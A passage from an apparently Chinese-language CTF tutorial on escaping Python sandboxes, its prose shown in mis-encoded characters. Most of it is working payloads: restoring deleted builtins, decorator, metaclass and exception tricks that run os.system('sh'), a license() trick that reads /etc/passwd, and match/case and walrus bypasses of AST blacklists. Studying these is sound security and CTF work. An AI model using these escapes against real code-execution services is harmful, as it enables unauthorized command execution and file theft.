&lt;built-in function eval&gt;
&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;]
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;
&gt;&gt;&gt; reload(__builtins__)
&lt;module &#x27;__builtin__&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;</code></pre>

<p>åœ¨ Python 3 ä¸­ï¼Œreload() å‡½æ•°è¢«ç§»åŠ¨åˆ° <code>importlib</code> æ¨¡å—ä¸­ï¼Œæ‰€ä»¥å¦‚æœè¦ä½¿ç”¨ reload() å‡½æ•°ï¼Œéœ€è¦å…ˆå¯¼å…¥<code> importlib</code> æ¨¡å—ã€‚</p>
<p>è²Œä¼¼æ–°ç‰ˆæœ¬çš„ python å³ä½¿è¿è¡Œäº†<code> importlib.reload</code> ä¹Ÿæ— æ³•æ¢å¤äº†ã€‚</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; importlib.reload(__builtins__)
&lt;module &#x27;builtins&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;</code></pre>

<h4 id="æ¢å¤-sys-modules"><a href="#æ¢å¤-sys-modules" class="headerlink" title="æ¢å¤ sys.modules"></a>æ¢å¤ <code>sys.modules</code></h4><p>ä¸€äº›è¿‡æ»¤ä¸­å¯èƒ½å°† <code>sys.modules[&#39;os&#39;]</code> è¿›è¡Œä¿®æ”¹. è¿™ä¸ªæ—¶å€™å³ä½¿å°† <code>os</code> æ¨¡å—å¯¼å…¥è¿›æ¥,ä¹Ÿæ˜¯æ— æ³•ä½¿ç”¨çš„.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;
&gt;&gt;&gt; __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</code></pre>

<p>ç”±äºå¾ˆå¤šåˆ«çš„å‘½ä»¤æ‰§è¡Œåº“ä¹Ÿä½¿ç”¨åˆ°äº† os,å› æ­¤ä¹Ÿä¼šå—åˆ°ç›¸åº”çš„å½±å“,ä¾‹å¦‚ subprocess</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __import__(&#x27;subprocess&#x27;).Popen(&#x27;whoami&#x27;, shell=True)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 688, in &lt;module&gt;
    class Popen(object):
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</code></pre>

<p>ç”±äº import å¯¼å…¥æ¨¡å—æ—¶ä¼šæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰è¿™ä¸ªç±»ï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½,æ²¡æœ‰åˆ™åŠ è½½.å› æ­¤æˆ‘ä»¬åªéœ€è¦å°† os æ¨¡å—åˆ é™¤,ç„¶åå†æ¬¡å¯¼å…¥å³å¯.</p>
<pre><code class="highlight plaintext">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj ä¸ºä½ åŠ çš„

del sys.modules[&#x27;os&#x27;]
import os
os.system(&#x27;ls&#x27;)</code></pre>

<h4 id="globals"><a href="#globals" class="headerlink" title="globals()"></a>globals()</h4><p>æœ‰äº›æ—¶å€™æ²™ç®±ä¼šè®¾ç½®</p>
<pre><code class="highlight plaintext">def blacklist_fun_callback(*args):
    print(&quot;Player! It&#x27;s already banned!&quot;)

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback</code></pre>

<p>æ¥è¦†ç›–å†…ç½®å‡½æ•°ï¼Œé™åˆ¶å‡½æ•°çš„ä½¿ç”¨ã€‚</p>
<p>ä½†æ˜¯<code>builtins</code>æ˜¯ä¸€ä¸ªä¸å¯å˜çš„æ¨¡å—å¯¹è±¡ï¼Œè¿™æ ·ä¿®æ”¹ä»…èƒ½å¤Ÿåœ¨å½“å‰çš„ä½œç”¨åŸŸä¸­ç”Ÿæ•ˆï¼Œè€Œ globals() ä¸­å­˜æ”¾äº† builtins æ¨¡å—çš„ç´¢å¼•ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–åˆ°åŸå§‹çš„æ–¹æ³•ã€‚</p>
<pre><code class="highlight plaintext">globals()[&quot;__builtins__&quot;][&#x27;breakpoint&#x27;]</code></pre>

<p>ä½†æ˜¯é¢˜ç›®å¦‚æœä½¿ç”¨äº†ä¸‹é¢çš„æ–¹å¼æ¥åˆ é™¤ï¼Œé‚£å°±æ²¡æœ‰åŠæ³•äº†ï¼Œå³ä½¿ reload é‡æ–°å¯¼å…¥ <code>builtins</code> æ¨¡å—ï¼Œè¾ƒæ–°ç‰ˆæœ¬çš„ python ä¸­ä¹Ÿæ— æ³•æ¢å¤ã€‚</p>
<pre><code class="highlight plaintext">del globals()[&quot;__builtins__&quot;].breakpoint</code></pre>

<h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>AST æ²™ç®±ä¼šå°†ç”¨æˆ·çš„è¾“å…¥è½¬åŒ–ä¸ºæ“ä½œç ,æ­¤æ—¶å­—ç¬¦ä¸²å±‚é¢çš„å˜æ¢åŸºæœ¬ä¸Šæ²¡ç”¨äº†,ä¸€èˆ¬æƒ…å†µä¸‹è€ƒè™‘ç»•è¿‡ AST é»‘åå•. ä¾‹å¦‚ä¸‹é¢çš„æ²™ç®±ç¦æ­¢äº† <code>ast.Import|ast.ImportFrom|ast.Call</code> è¿™ä¸‰ç±»æ“ä½œ, è¿™æ ·ä¸€æ¥å°±æ— æ³•å¯¼å…¥æ¨¡å—å’Œæ‰§è¡Œå‡½æ•°.</p>
<pre><code class="highlight plaintext">import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;)
  exec(compiled)</code></pre>

<p>ä¸‹é¢çš„ without call æ¥æºäº hacktricks</p>
<h4 id="without-call"><a href="#without-call" class="headerlink" title="without call"></a>without call</h4><p>å¦‚æœåŸºäº AST çš„æ²™ç®±é™åˆ¶äº†æ‰§è¡Œå‡½æ•°,é‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°ä¸€ç§ä¸éœ€è¦æ‰§è¡Œå‡½æ•°çš„æ–¹å¼æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.</p>
<h5 id="è£…é¥°å™¨"><a href="#è£…é¥°å™¨" class="headerlink" title="è£…é¥°å™¨"></a><strong>è£…é¥°å™¨</strong></h5><p>åˆ©ç”¨ payload å¦‚ä¸‹ï¼Œä¹ä¸€çœ‹å¯èƒ½æœ‰äº›è¿·æƒ‘ï¼Œä½†è¯¥ payload å®é™…ä¸Šç­‰æ•ˆäº exec(input(X))</p>
<pre><code class="highlight plaintext">@exec
@input
class X:
    pass</code></pre>

<p>å½“æˆ‘ä»¬è¾“å…¥ä¸Šè¿°çš„ä»£ç å, Python ä¼šæ‰“å¼€è¾“å…¥,æ­¤æ—¶æˆ‘ä»¬å†è¾“å…¥ payload å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; @exec
... @input
... class X:
...     pass
... 
&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</code></pre>

<p>ç”±äºè£…é¥°å™¨ä¸ä¼šè¢«è§£æä¸ºè°ƒç”¨è¡¨è¾¾å¼æˆ–è¯­å¥, å› æ­¤å¯ä»¥ç»•è¿‡é»‘åå•, æœ€ç»ˆä¼ å…¥çš„ payload æ˜¯ç”± input æ¥æ”¶çš„, å› æ­¤ä¹Ÿä¸ä¼šè¢«æ‹¦æˆª.</p>
<p>å…¶å®è¿™æ ·çš„è¯,æ„é€ å…¶å®å¯ä»¥æœ‰å¾ˆå¤š,æ¯”å¦‚ä½¿ç”¨å•å±‚çš„è£…é¥°å™¨ï¼Œæ‰“å¼€ help å‡½æ•°.</p>
<pre><code class="highlight plaintext">@help
class X:
    pass</code></pre>

<p>è¿™æ ·å¯ä»¥ç›´æ¥è¿›å…¥å¸®åŠ©æ–‡æ¡£:</p>
<pre><code class="highlight plaintext">Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)</code></pre>

<p>å†æ¬¡è¾“å…¥ !sh å³å¯æ‰“å¼€ &#x2F;bin&#x2F;sh</p>
<p>æˆ–æ˜¯ç»™è£…é¥°å™¨åŠ ä¸€äº›å‚æ•°ã€‚</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@getattr(os,&quot;system&quot;)
@fake_wrapper
def something():
  pass</code></pre>

<p>ç›¸å½“äºï¼š</p>
<pre><code class="highlight plaintext">getattr(os,&quot;system&quot;)(fake_wrapper(something))</code></pre>

<p>äº¦æˆ–è€…è‡ªå®šä¹‰ä¸€ä¸ªè£…é¥°å™¨ï¼š</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@os.system
@fake_wrapper
def something():
  pass</code></pre>

<p>ç›¸å½“äº <code>os.system(fake_wrapper(something))</code>ï¼Œä¹Ÿå°±æ˜¯ <code>os.system(â€˜/bin/shâ€™)</code></p>
<h5 id="å‡½æ•°è¦†ç›–"><a href="#å‡½æ•°è¦†ç›–" class="headerlink" title="å‡½æ•°è¦†ç›–"></a><strong>å‡½æ•°è¦†ç›–</strong></h5><p>æˆ‘ä»¬çŸ¥é“åœ¨ Python ä¸­è·å–ä¸€ä¸ªçš„å±æ€§ä¾‹å¦‚ <code>obj[argument]</code> å®é™…ä¸Šæ˜¯è°ƒç”¨çš„ <code>obj.__getitem__</code> æ–¹æ³•.å› æ­¤åªéœ€è¦è¦†ç›–å…¶ <code>__getitem__</code> æ–¹æ³•, å³å¯åœ¨ä½¿ç”¨ <code>obj[argument]</code> æ‰§è¡Œä»£ç :</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; class A:
...     __getitem__ = exec
... 
&gt;&gt;&gt; A()[&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;]</code></pre>

<p>ä½†æ˜¯è¿™é‡Œè°ƒç”¨äº† A çš„æ„é€ å‡½æ•°, å› æ­¤ AST ä¸­è¿˜æ˜¯ä¼šå‡ºç° <code>ast.Call</code>. å¦‚ä½•åœ¨ä¸æ‰§è¡Œæ„é€ å‡½æ•°çš„æƒ…å†µä¸‹è·å–ç±»å®ä¾‹å‘¢?</p>
<p><strong><code>metaclass</code> åˆ©ç”¨</strong></p>
<p>Python ä¸­æä¾›äº†ä¸€ç§å…ƒç±»(<code>metaclass</code>)æ¦‚å¿µã€‚å…ƒç±»æ˜¯åˆ›å»ºç±»çš„â€œç±»â€ã€‚åœ¨ Pythonä¸­ï¼Œç±»æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå…ƒç±»å°±æ˜¯åˆ›å»ºè¿™äº›ç±»ï¼ˆå³ç±»çš„å¯¹è±¡ï¼‰çš„ç±»ã€‚</p>
<p>å…ƒç±»åœ¨ Python ä¸­çš„ä½œç”¨ä¸»è¦æ˜¯ç”¨æ¥åˆ›å»ºç±»ã€‚ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œè€Œå…ƒç±»åˆ™æ˜¯ç±»çš„æ¨¡æ¿ã€‚å…ƒç±»å®šä¹‰äº†ç±»çš„è¡Œä¸ºå’Œå±æ€§ï¼Œå°±åƒç±»å®šä¹‰äº†å¯¹è±¡çš„è¡Œä¸ºå’Œå±æ€§ä¸€æ ·ã€‚</p>
<p>ä¸‹é¢æ˜¯åŸºäºå…ƒç±»çš„ payload, åœ¨ä¸ä½¿ç”¨æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub[&#x27;import os; os.system(&quot;sh&quot;)&#x27;]</code></pre>

<p>é™¤äº† <code>__getitem__</code> ä¹‹å¤–å…¶ä»–æ–¹æ³•çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹:</p>
<pre><code class="highlight plaintext">__sub__ (k - &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mul__ (k * &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__floordiv__ (k // &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__truediv__ (k / &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mod__ (k % &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__pow__ (k**&#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__lt__ (k &lt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__le__ (k &lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__eq__ (k == &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ne__ (k != &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ge__ (k &gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__gt__ (k &gt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iadd__ (k += &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__isub__ (k -= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__imul__ (k *= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ifloordiv__ (k //= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__idiv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__itruediv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;) (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ipow__ (k **= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ilshift__ (k&lt;&lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__irshift__ (k &gt;&gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iand__ (k = &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ior__ (k |= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ixor__ (k ^= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</code></pre>

<p>ç¤ºä¾‹:</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-&#x27;import os; os.system(&quot;sh&quot;)&#x27;</code></pre>

<p><strong>exceptions åˆ©ç”¨</strong></p>
<p>åˆ©ç”¨ exceptions çš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡æ˜¾ç¤ºåœ°å®ä¾‹åŒ–ä¸€ä¸ªç±», å¦‚æœä¸€ä¸ªç±»ç»§æ‰¿äº† Exception ç±», é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ raise å…³é”®å­—æ¥å®ä¾‹åŒ–. payload å¦‚ä¸‹:</p>
<pre><code class="highlight plaintext">class RCE(Exception):
    def __init__(self):
        self += &#x27;import os; os.system(&quot;sh&quot;)&#x27;
    __iadd__ = exec 
    
raise RCE</code></pre>

<p>raise ä¼šè¿›å…¥ RCE çš„ <code>__init__</code>, ç„¶åè§¦å‘ <code>__iadd__</code> ä¹Ÿå°±æ˜¯ exec.</p>
<p>å½“ç„¶, è§¦å‘å¼‚å¸¸ä¸ä¸€å®šéœ€è¦ raise, ä¸»åŠ¨åœ°ç¼–å†™é”™è¯¯ä»£ç ä¹Ÿå¯ä»¥è§¦å‘,ä¸æ˜¯å°±æœ‰äº†å¦‚ä¸‹çš„å‡ ç§ payload.</p>
<pre><code class="highlight plaintext">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#x27;sh&#x27;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0</code></pre>

<p>è¿™ä¸ª payload ä¸­ç›´æ¥å°† sys.excepthook è¿›è¡Œè¦†ç›–,ä»»ä½•å¼‚å¸¸äº§ç”Ÿæ—¶éƒ½ä¼šè§¦å‘.</p>
<pre><code class="highlight plaintext">class X():
  def __init__(self, a, b, c, d, e):
    self += &quot;print(open(&#x27;flag&#x27;).read())&quot;
  __iadd__ = eval
__builtins__.__import__ = X
&#123;&#125;[1337]</code></pre>

<p>è¿™ä¸ª payload å°† <code>__import__</code> å‡½æ•°è¿›è¡Œè¦†ç›–, æœ€åçš„ {}[1337] åœ¨æ­£å¸¸æƒ…å†µä¸‹ä¼šå¼•å‘ KeyError å¼‚å¸¸ï¼Œå› ä¸º Python åœ¨å¼•å‘å¼‚å¸¸æ—¶ä¼šå°è¯•å¯¼å…¥æŸäº›æ¨¡å—ï¼ˆæ¯”å¦‚traceback æ¨¡å—ï¼‰ï¼Œå¯¼å…¥æ—¶å°±ä¼šè§¦å‘ <code>__import__</code>.</p>
<h5 id="é€šè¿‡-license-å‡½æ•°è¯»å–æ–‡ä»¶"><a href="#é€šè¿‡-license-å‡½æ•°è¯»å–æ–‡ä»¶" class="headerlink" title="é€šè¿‡ license å‡½æ•°è¯»å–æ–‡ä»¶"></a>é€šè¿‡ license å‡½æ•°è¯»å–æ–‡ä»¶</h5><pre><code class="highlight plaintext">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>

<p>ä¸Šé¢çš„ payload ä¿®æ”¹å†…å»ºå‡½æ•° license çš„æ–‡ä»¶ååˆ—è¡¨ä¸º &#x2F;etc&#x2F;passwd å½“è°ƒç”¨ <code>license()</code> æ—¶ä¼šæ‰“å°è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&quot;license&quot;]._Printer__filenames
[&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/../LICENSE&#x27;, &#x27;/usr/lib/python3.11/LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/LICENSE&#x27;, &#x27;./LICENSE.txt&#x27;, &#x27;./LICENSE&#x27;]</code></pre>

<p>payload ä¸­å°† help ç±»çš„ <code>__enter__</code> æ–¹æ³•è¦†ç›–ä¸º <code>license</code> æ–¹æ³•, è€Œ with è¯­å¥åœ¨åˆ›å»ºä¸Šä¸‹æ–‡æ—¶ä¼šè°ƒç”¨ help çš„<code>__enter__</code>, ä»è€Œæ‰§è¡Œ <code>license</code> æ–¹æ³•. è¿™é‡Œçš„ help ç±»åªæ˜¯ä¸€ä¸ªè½½ä½“, æ›¿æ¢ä¸ºå…¶ä»–çš„æ”¯æŒä¸Šä¸‹æ–‡çš„ç±»æˆ–è€…è‡ªå®šä¹‰ä¸€ä¸ªç±»ä¹Ÿæ˜¯å¯ä»¥çš„. ä¾‹å¦‚:</p>
<pre><code class="highlight plaintext">class MyContext:
    pass
    
__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>

<h4 id="æ‰“å°-AST"><a href="#æ‰“å°-AST" class="headerlink" title="æ‰“å° AST"></a>æ‰“å° AST</h4><pre><code class="highlight plaintext">import os
import ast 

BAD_ATS = &#123;
  ast.Attribute,
  ast.AST,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
&#125;

a = &#x27;&#x27;&#x27;
[
    system:=111,
    bash:=222
]
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))


for x in ast.walk(compile(a, &quot;&lt;QWB7th&gt;&quot;, &quot;exec&quot;, flags=ast.PyCF_ONLY_AST)):
  if type(x) in BAD_ATS:
    print(type(x))
    exit()

print(&quot;[+] OK&quot;)</code></pre>

<h4 id="ç»•è¿‡-ast-Attribute-è·å–å±æ€§"><a href="#ç»•è¿‡-ast-Attribute-è·å–å±æ€§" class="headerlink" title="ç»•è¿‡ ast.Attribute è·å–å±æ€§"></a>ç»•è¿‡ ast.Attribute è·å–å±æ€§</h4><p>å¦‚ä½•ç»•è¿‡ ast.Attributeï¼Ÿpython 3.10 ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ç‰¹æ€§ï¼šmatch&#x2F;caseï¼Œç±»ä¼¼å…¶ä»–è¯­è¨€ä¸­çš„ switch&#x2F;caseï¼Œä½† match&#x2F;case æ›´åŠ å¼ºå¤§ï¼Œé™¤äº†å¯ä»¥åŒ¹é…æ•°å­—å­—ç¬¦ä¸²ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åŒ¹é…å­—å…¸ã€å¯¹è±¡ç­‰ã€‚</p>
<p>æœ€ç®€å•çš„ç¤ºä¾‹ï¼ŒåŒ¹é…å­—ç¬¦ä¸²ï¼š</p>
<pre><code class="highlight plaintext">item = 2

match item:
    case 1:
        print(&quot;One&quot;)
    case 2:
        print(&quot;Two&quot;)

# Two</code></pre>

<p>è¿˜å¯ä»¥åŒ¹é…å¹¶è‡ªåŠ¨èµ‹å€¼ç»™å±€éƒ¨å˜é‡ï¼Œä¼ å…¥ (1,2) æ—¶ï¼Œä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ†æ”¯ï¼Œå¹¶å¯¹ x,y èµ‹å€¼ã€‚</p>
<pre><code class="highlight plaintext">item = (1, 2)

match item:
    case (x, y, z):
        print(f&quot;&#123;x&#125; &#123;y&#125; &#123;z&#125;&quot;)
    case (x, y):
        print(f&quot;&#123;x&#125; &#123;y&#125;&quot;)
    case (x,):
        print(f&quot;&#123;x&#125;&quot;)</code></pre>

<p>å¯¹äºåŸºæœ¬ç±»å‹çš„åŒ¹é…æ¯”è¾ƒå¥½ç†è§£ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåŒ¹é…ç±»çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="highlight plaintext">class AClass:
    def __init__(self, value):
        self.thing = value

item = AClass(32)

match item:
    case AClass(thing=x):
        print(f&quot;Got &#123;x = &#125;!&quot;)

# Got x = 32!</code></pre>

<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé‡ç‚¹å…³æ³¨<code>case AClass(thing=x)</code>ï¼Œè¿™é‡Œçš„å«ä¹‰å¹¶éæ˜¯å°† x èµ‹å€¼ç»™ thingï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç†è§£ä¸ºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¡¨ç¤ºåŒ¹é…ç±»å‹ä¸º <code>AClass</code> ä¸”å­˜åœ¨ thing å±æ€§çš„å¯¹è±¡ï¼Œå¹¶ä¸” thing å±æ€§å€¼è‡ªåŠ¨èµ‹å€¼ç»™ xã€‚</p>
<p>è¿™æ ·ä¸€æ¥å°±å¯ä»¥åœ¨ä¸é€‚ç”¨ . å·çš„æƒ…å†µä¸‹è·å–åˆ°ç±»çš„å±æ€§å€¼ã€‚ä¾‹å¦‚è·å– <code>&#39;&#39;.__class__</code>ï¼Œå¯ä»¥ç¼–å†™å¦‚ä¸‹çš„ match&#x2F;case è¯­å¥ï¼š</p>
<pre><code class="highlight plaintext">match str():
    case str(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>

<p>å¯ä»¥çœ‹åˆ° x å°±æ˜¯ <code>&#39;&#39;.__class__</code>. å› ä¸ºæ‰€æœ‰çš„ç±»éƒ½è¾“å…¥ object ç±»ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ object æ¥æ›¿ä»£ strï¼Œè¿™æ ·å°±æ— éœ€å…³æ³¨åŒ¹é…åˆ°çš„åˆ°åº•æ˜¯å“ªä¸ªç±»ã€‚</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>

<p>å†æµ‹è¯•ä¸€ä¸‹è¯¥ payload çš„ ASTï¼š</p>
<pre><code class="highlight plaintext">import os
import ast 

a = &#x27;&#x27;&#x27;
match str():
    case str(__class__=x):
        print(x)
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</code></pre>

<p>AST å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Match(
            subject=Call(
                func=Name(id=&#x27;str&#x27;, ctx=Load()),
                args=[],
                keywords=[]),
            cases=[
                match_case(
                    pattern=MatchClass(
                        cls=Name(id=&#x27;str&#x27;, ctx=Load()),
                        patterns=[],
                        kwd_attrs=[
                            &#x27;__class__&#x27;],
                        kwd_patterns=[
                            MatchAs(name=&#x27;x&#x27;)]),
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id=&#x27;print&#x27;, ctx=Load()),
                                args=[
                                    Name(id=&#x27;x&#x27;, ctx=Load())],
                                keywords=[]))])])],
    type_ignores=[])</code></pre>

<p>å¯ä»¥çœ‹åˆ°ç¡®å®æ²¡æœ‰ Attributeï¼Œä¾æ®è¿™ä¸ªåŸç†ï¼Œå°±å¯ä»¥ç»•è¿‡ ast.Attribute</p>
<p>æˆ‘ä»¬å¯ä»¥æ„é€ æ›¿ä»£ <code>&#39;&#39;.__class__.__base__.__subclasses__()</code>çš„ payloadï¼š</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=clazz):
        match clazz:
            case object(__base__=bass):
                match bass:
                    case object(__subclasses__=subclazz):
                        print(subclazz)</code></pre>

<h4 id="ç»•è¿‡-ast-Assign-èµ‹å€¼å˜é‡"><a href="#ç»•è¿‡-ast-Assign-èµ‹å€¼å˜é‡" class="headerlink" title="ç»•è¿‡ ast.Assign èµ‹å€¼å˜é‡"></a>ç»•è¿‡ ast.Assign èµ‹å€¼å˜é‡</h4><p>ast.Assign æ— æ³•ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ &#x3D; æ¥è¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨æµ·è±¡è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">[
    system:=111,
    bash:=222
]</code></pre>

<p>æ­¤æ—¶ AST æ ‘å¦‚ä¸‹,æµ·è±¡è¡¨è¾¾å¼ç”¨åˆ°çš„æ˜¯ ast.NamedExpr è€Œé ast.Assign</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Expr(
            value=List(
                elts=[
                    NamedExpr(
                        target=Name(id=&#x27;system&#x27;, ctx=Store()),
                        value=Constant(value=111)),
                    NamedExpr(
                        target=Name(id=&#x27;bash&#x27;, ctx=Store()),
                        value=Constant(value=222))],
                ctx=Load()))],
    type_ignores=[])</code></pre>

<h4 id="ç»•è¿‡-ast-Constant-è·å–æ•°å­—ã€å­—ç¬¦ä¸²"><a href="#ç»•è¿‡-ast-Constant-è·å–æ•°å­—ã€å­—ç¬¦ä¸²" class="headerlink" title="ç»•è¿‡ ast.Constant è·å–æ•°å­—ã€å­—ç¬¦ä¸²"></a>ç»•è¿‡ ast.Constant è·å–æ•°å­—ã€å­—ç¬¦ä¸²</h4><p>é¢˜ç›®é™åˆ¶äº† ast.Constantï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä½¿ç”¨æ•°å­—ã€å­—ç¬¦ä¸²å¸¸é‡ï¼Œä½†é€šè¿‡å…¶ä»–çš„å‡½æ•°ç»„åˆå¯ä»¥æ„é€ å‡ºæ•°å­—å’Œå­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">&quot;&quot; : str()
0  : len([])
&quot;0&quot;: str(len([]))
